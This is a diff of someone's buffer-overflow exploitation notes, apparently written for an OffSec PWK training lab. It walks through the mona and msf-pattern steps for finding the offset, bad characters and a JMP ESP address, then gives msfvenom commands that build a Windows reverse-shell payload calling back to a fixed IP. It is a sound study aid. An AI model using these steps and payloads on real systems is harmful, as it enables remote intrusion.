@@ -1,1 +1,61 @@
-msfvenom -p windows/shell_reverse_tcp LHOST=10.6.75.240 LPORT=1818 EXITFUNC=thread -f c -a x86 -b "\x00"
+First of all, we need to set mona config directory :
+
+!mona config -set workingfolder c:\mona\%p
+
+
+
+And then create pattern :
+
+msf-pattern_create -l 2400
+
+
+
+If program got crush, find offset :
+
+!mona findmsp -distance 2400
+
+We will get the required offset.
+
+
+
+Let's try to overwrite EIP address with 42424242
+
+return = "BBBB"
+
+
+
+Let's find bad char, first set config to compare :
+
+!mona bytearray -b "\x00"
+
+
+
+Generate bad chars
+
+
+
+Run exploit.py
+
+
+
+!mona compare -f C:\mona\offsec_pwk_srv\bytearray.bin -a  <ESP-address>
+
+
+
+find actual return address :
+
+!mona jmp -r esp -cpb  "\x00"
+
+\x83\x66\x52\x56
+
+
+
+Add padding in exploit.py
+
+padding = "\x90" * 16
+
+
+
+Shell payalod :
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.6.75.240 LPORT=443 EXITFUNC=thread -f c -a x86 -b "\x00"
